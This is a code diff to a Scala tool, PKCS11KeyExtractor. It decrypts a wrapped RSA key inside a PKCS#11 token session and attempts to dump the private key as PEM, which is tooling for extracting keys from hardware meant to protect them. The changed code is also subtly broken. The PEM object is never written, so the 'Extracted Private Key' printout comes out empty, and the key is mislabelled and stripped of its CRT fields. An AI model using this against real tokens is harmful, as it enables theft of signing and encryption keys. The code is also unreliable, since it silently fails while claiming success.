@@ -1,6 +1,7 @@
 package fr.itassets.p11
 
 import java.io.StringWriter
+import java.security.spec.RSAPrivateKeySpec
 import java.security.{KeyFactory, Security}
 
 import iaik.pkcs.pkcs11.objects.{AESSecretKey, RSAPrivateKey, RSAPublicKey}
@@ -10,7 +11,7 @@ import iaik.pkcs.pkcs11.parameters.InitializationVectorParameters
 import org.bouncycastle.crypto.params.RSAPrivateCrtKeyParameters
 import org.bouncycastle.crypto.util.PrivateKeyFactory
 import org.bouncycastle.jce.provider.BouncyCastleProvider
-import org.bouncycastle.util.io.pem.PemWriter
+import org.bouncycastle.util.io.pem.{PemObject, PemWriter}
 import scopt.OptionParser
 
 import scala.collection.mutable
@@ -91,8 +92,19 @@ object PKCS11KeyExtractor extends App {
             val clearKey = session.decrypt(wrappedKey)
 
             // Converting from PKCS8 to PKCS1
-            val pkcs8Key = PrivateKeyFactory.createKey(clearKey).asInstanceOf[RSAPrivateCrtKeyParameters]
-            println(s"Bingo: ${pkcs8Key.toString}")
+            val pkcs8PrivateKeyParameters = PrivateKeyFactory.createKey(clearKey).asInstanceOf[RSAPrivateCrtKeyParameters]
+            val privateKeySpec = new RSAPrivateKeySpec(pkcs8PrivateKeyParameters.getModulus, pkcs8PrivateKeyParameters.getExponent)
+            val privateKey = KeyFactory.getInstance("RSA", "BC").generatePrivate(privateKeySpec)
+
+            // Dumping Private Key in PEM format
+            val stringWriter = new StringWriter()
+            val pemWriter = new PemWriter(stringWriter)
+            val pemObject = new PemObject("RSA PRIVATE KEY", privateKey.getEncoded)
+            pemWriter.flush()
+            pemWriter.close()
+            println(s"Extracted Private Key:\n${stringWriter.toString}")
+            stringWriter.close()
+
           } catch {
             case e: Exception => println(s"[!] Error extracting private key: '${e.getMessage}'")
           }
